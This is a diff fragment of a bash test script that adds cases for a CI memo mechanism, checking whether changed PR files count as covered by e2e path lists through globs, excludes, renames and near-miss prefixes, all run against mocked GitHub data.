+    "$RENDERABLE" "$M_RUNS" "$M_ART" "$M_JOBS" "$(ui_compare ahead @300)"
+ui_memo_case "memo-covered-change: a changed file under e2e.paths holds" vr-missing \
+    "$RENDERABLE" "$M_RUNS" "$M_ART" "$M_JOBS" "$(ui_compare ahead bin/lib/foo.sh)"
+ui_memo_case "memo-rename-from-covered: a rename away from a covered path holds" vr-missing \
+    "$RENDERABLE" "$M_RUNS" "$M_ART" "$M_JOBS" "$(ui_compare ahead 'bin/lib/foo.sh=>notes/foo.sh')"
+command grep -vxF '.github' "$UI_TMP/e2e.paths" > "$UI_TMP/e2e-no-github.paths"
+ui_memo_case "memo-ui-path-only: a UI_PATH_RE file holds even when e2e.paths misses it" vr-missing \
+    "$RENDERABLE" "$M_RUNS" "$M_ART" "$M_JOBS" "$(ui_compare ahead .github/workflows/e2e-tests.yml)" \
+    "$UI_TMP/clean.zip" "UI_MEMO_PATHS_FILE=$UI_TMP/e2e-no-github.paths"
+ui_memo_case "memo-prefix-near-miss: ibl5-notes.txt is not under the ibl5 entry" not-ui \
+    "$RENDERABLE" "$M_RUNS" "$M_ART" "$M_JOBS" "$(ui_compare ahead ibl5-notes.txt)"
+printf '%s\n' ':(glob)tools/*.cfg' > "$UI_TMP/e2e-glob.paths"
+ui_memo_case "memo-glob-include: a glob include covers tools/a.cfg" vr-missing \
+    "$RENDERABLE" "$M_RUNS" "$M_ART" "$M_JOBS" "$(ui_compare ahead tools/a.cfg)" \
+    "$UI_TMP/clean.zip" "UI_MEMO_PATHS_FILE=$UI_TMP/e2e-glob.paths"
+ui_memo_case "memo-exclude: an excluded path is not covered" not-ui \
+    "$RENDERABLE" "$M_RUNS" "$M_ART" "$M_JOBS" "$(ui_compare ahead ibl5/docs/x.md)"
+ui_memo_case "memo-paths-unset: no memo paths file holds" vr-missing \
+    "$RENDERABLE" "$M_RUNS" "$M_ART" "$M_JOBS" "$M_CMP" "$UI_TMP/clean.zip" -UI_MEMO_PATHS_FILE
+ui_memo_case "memo-paths-empty: an empty memo paths variable holds" vr-missing \
+    "$RENDERABLE" "$M_RUNS" "$M_ART" "$M_JOBS" "$M_CMP" "$UI_TMP/clean.zip" UI_MEMO_PATHS_FILE=
+printf '%s\n' '# c' ':(exclude)ibl5/docs' > "$UI_TMP/e2e-excl.paths"
+ui_memo_case "memo-paths-no-includes: a list with no include pattern holds" vr-missing \
+    "$RENDERABLE" "$M_RUNS" "$M_ART" "$M_JOBS" "$M_CMP" "$UI_TMP/clean.zip" "UI_MEMO_PATHS_FILE=$UI_TMP/e2e-excl.paths"
+{ cat "$RENDERABLE"; printf '%s\n' bin/ci-memo; } > "$UI_TMP/paths-ci-memo.txt"
+ui_memo_case "memo-pr-edits-ci-memo: a PR that edits bin/ci-memo holds" vr-missing \
+    "$UI_TMP/paths-ci-memo.txt" "$M_RUNS" "$M_ART" "$M_JOBS" "$M_CMP"
+{ cat "$RENDERABLE"; printf '%s\n' bin/ci-memory; } > "$UI_TMP/paths-ci-memory.txt"
+ui_memo_case "memo-pr-ci-memo-near-miss: bin/ci-memory is not the memo machinery" not-ui \
+    "$UI_TMP/paths-ci-memory.txt" "$M_RUNS" "$M_ART" "$M_JOBS" "$M_CMP"
+# memo-direct-fetch: a direct ui_fetch_gallery_gh call leaves UI_PR_PATHS unset, so the fallback refuses.
+MEMO_DIRECT_RC=0
+# shellcheck disable=SC2016  # $1 and $2 expand inside the child bash
+env PATH="$UI_TMP/fakebin:$PATH" GH_REPO=o/r HEAD_SHA="$UI_HEAD" PR=42 HEAD_REF=feat HEAD_REPO=o/r \
+    UI_MEMO_PATHS_FILE="$UI_TMP/e2e.paths" MOCK_RUNS="$M_RUNS" MOCK_ARTS="$M_ART" MOCK_ZIP="$UI_TMP/clean.zip" \
+    MOCK_JOBS="$M_JOBS" MOCK_COMPARE="$M_CMP" \
+    bash -c 'set -euo pipefail; unset UI_PR_PATHS; source "$1"; ui_fetch_gallery_gh "$2"' _ "$UI_LIB" "$UI_TMP/g.json" \
+    > /dev/null 2>&1 || MEMO_DIRECT_RC=$?
+expect "memo-direct-fetch: ui_fetch_gallery_gh without UI_PR_PATHS returns rc 3" 3 "$MEMO_DIRECT_RC"
 
 # ui_fetch_rc <runs_json> <arts_json>: prints the fetch rc (3 = finished, no artifact).
 ui_fetch_rc() {
